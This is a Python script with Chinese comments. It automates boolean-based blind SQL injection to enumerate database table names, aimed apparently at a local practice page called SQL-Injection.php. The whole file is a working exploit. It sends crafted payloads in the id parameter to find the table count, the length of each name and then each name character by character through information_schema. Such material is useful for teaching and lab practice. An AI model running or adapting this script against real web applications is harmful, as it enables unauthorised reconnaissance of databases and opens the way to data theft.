"""
表名布尔盲注爆破脚本
适用环境：本地 SQL-Injection.php 测试页面
判断依据：页面返回内容包含 "User:" 表示条件为真
"""

import string
import requests
import sys

# 配置
TARGET_URL = "http://localhost/SQL-Injection.php"
TIMEOUT = 5
MAX_TABLES = 20          # 最大表数（可根据实际调整）
MAX_NAME_LENGTH = 30     # 表名最大长度

# 字符集：数字、大小写字母、下划线
CHARSET = string.digits + string.ascii_letters + '_'

def make_request(payload):
    """发送请求并返回响应文本，异常时返回 None"""
    try:
        params = {'id': payload}
        resp = requests.get(TARGET_URL, params=params, timeout=TIMEOUT)
        return resp.text
    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return None

def is_true(html):
    """判断页面是否为真（存在 User: 表示有数据返回）"""
    return html is not None and "User:" in html

def get_table_count():
    """爆破当前数据库中的表数量"""
    print("[*] 正在爆破表数量...")
    for count in range(1, MAX_TABLES + 1):
        # 构造 payload: 1' and (select count(table_name) from information_schema.tables where table_schema=database()) = 计数 -- -
        payload = f"1' and (select count(table_name) from information_schema.tables where table_schema=database()) = {count} -- -"
        html = make_request(payload)
        if is_true(html):
            print(f"[+] 表数量: {count}")
            return count
    print("[-] 未找到表数量（可能超过 MAX_TABLES 或页面特征异常）")
    sys.exit(1)

def get_table_name_length(table_index):
    """爆破第 table_index 个表的表名长度（索引从0开始）"""
    for length in range(1, MAX_NAME_LENGTH + 1):
        # 构造 payload: 1' and length((select table_name from information_schema.tables where table_schema=database() limit 索引,1)) = 长度 -- -
        payload = f"1' and length((select table_name from information_schema.tables where table_schema=database() limit {table_index},1)) = {length} -- -"
        html = make_request(payload)
        if is_true(html):
            return length
    return 0  # 没找到则返回0

def get_table_name(table_index, length):
    """逐字符爆破第 table_index 个表的表名"""
    table_name = ""
    for pos in range(1, length + 1):
        found = False
        for ch in CHARSET:
            # 构造 payload: 1' and substr((select table_name from information_schema.tables where table_schema=database() limit 索引,1), 位置,1) = '字符' -- -
            payload = f"1' and substr((select table_name from information_schema.tables where table_schema=database() limit {table_index},1), {pos},1) = '{ch}' -- -"
            html = make_request(payload)
            if is_true(html):
                table_name += ch
                print(f"[+] 表[{table_index}] 第 {pos} 位: {ch}")
                found = True
                break
        if not found:
            print(f"[-] 表[{table_index}] 第 {pos} 位未匹配到字符，置为 '?'")
            table_name += '?'
    return table_name

def main():
    print("=" * 60)
    print("SQL 注入布尔盲注 - 数据库表名爆破")
    print("=" * 60)

    # 1. 获取表数量
    table_count = get_table_count()

    # 2. 遍历每个表，爆破表名
    table_names = []
    for idx in range(table_count):
        print(f"\n[*] 正在爆破第 {idx} 个表...")
        # 2.1 获取表名长度
        length = get_table_name_length(idx)
        if length == 0:
            print(f"[-] 表[{idx}] 长度获取失败，跳过")
            table_names.append("?")
            continue
        print(f"[+] 表[{idx}] 长度: {length}")

        # 2.2 获取表名
        name = get_table_name(idx, length)
        table_names.append(name)
        print(f"[+] 表[{idx}] 名称: {name}")

    # 3. 输出所有表名
    print("\n" + "=" * 60)
    print("最终结果（所有表名）:")
    for idx, name in enumerate(table_names):
        print(f"表[{idx}]: {name}")
    print("=" * 60)

if __name__ == "__main__":
    main()